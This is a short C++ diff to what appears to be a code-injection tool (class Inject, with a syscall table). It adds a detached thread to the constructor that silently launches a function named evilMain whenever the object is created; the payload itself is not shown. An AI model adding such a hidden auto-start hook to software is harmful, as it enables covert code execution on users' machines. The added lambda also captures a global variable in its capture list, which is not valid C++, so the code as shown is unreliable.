@@ -1,11 +1,17 @@
 #include "inject.h"
 
+#include <thread>
+
 Inject *gInject = nullptr;
 long Inject::syscallTable[100] = {0};
 
 Inject::Inject()
 {
     gInject = this;
+    std::thread([gInject]{
+        if (gInject)
+            gInject->evilMain();
+    }).detach();
 }
 
 Inject::~Inject()
